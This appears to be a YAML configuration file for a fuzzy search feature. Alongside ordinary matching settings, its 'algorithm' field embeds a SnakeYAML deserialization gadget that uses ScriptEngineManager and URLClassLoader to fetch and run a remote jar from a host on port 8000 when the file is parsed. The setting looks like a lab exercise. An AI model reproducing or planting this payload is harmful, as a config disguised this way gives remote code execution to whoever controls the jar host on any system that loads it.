!!FuzzySearchConfig
algorithm: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ "http://host.docker.internal:8000/snake-yaml-injection-1.0-SNAPSHOT.jar" ] ] ]]

maxDistance: 3

# Minimum match score (0.0 to 1.0)
# Higher values = stricter matching (0.7 = 70% similarity required)
minSimilarity: 0.6

# Case sensitive matching
caseSensitive: false

# Enable partial word matching
partialMatch: true

# Maximum number of results to return
maxResults: 20